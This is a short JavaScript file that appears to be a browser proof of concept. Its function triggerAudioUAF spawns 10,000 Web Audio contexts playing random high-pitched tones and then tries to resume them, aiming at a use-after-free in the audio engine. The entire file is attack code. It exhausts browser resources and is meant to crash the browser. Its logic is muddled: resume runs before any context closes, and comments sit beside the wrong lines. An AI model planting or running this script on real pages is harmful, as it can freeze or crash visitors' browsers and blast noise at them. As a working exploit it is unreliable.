let audioContexts = [];

function createAudioContexts(count) {
  for (let i = 0; i < count; i++) {
    let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    audioContexts.push(audioCtx);
    let oscillator = audioCtx.createOscillator();
    oscillator.type = 'sine';
    oscillator.frequency.setValueAtTime(Math.random() * 5000 + 1000, audioCtx.currentTime);
    oscillator.connect(audioCtx.destination);
    oscillator.start(); // Stop oscillator after 1 second

    setTimeout(() => {
      oscillator.stop(); // Close and free AudioContext

      audioCtx.close().then(() => {
        // Remove the AudioContext from the array
        let index = audioContexts.indexOf(audioCtx);

        if (index !== -1) {
          audioContexts.splice(index, 1);
        }
      });
    }, 1000);
  }
}

function triggerAudioUAF() {
  createAudioContexts(10000);
  setTimeout(() => {
    audioContexts.forEach((ctx, index) => {
      try {
        ctx.resume();
        console.log('Resuming AudioContext:', index);
      } catch (e) {
        console.error('Error resuming AudioContext:', e);
      }
    });
  }, 200);
}

document.getElementById('startButton').addEventListener('click', () => {
  triggerAudioUAF();
});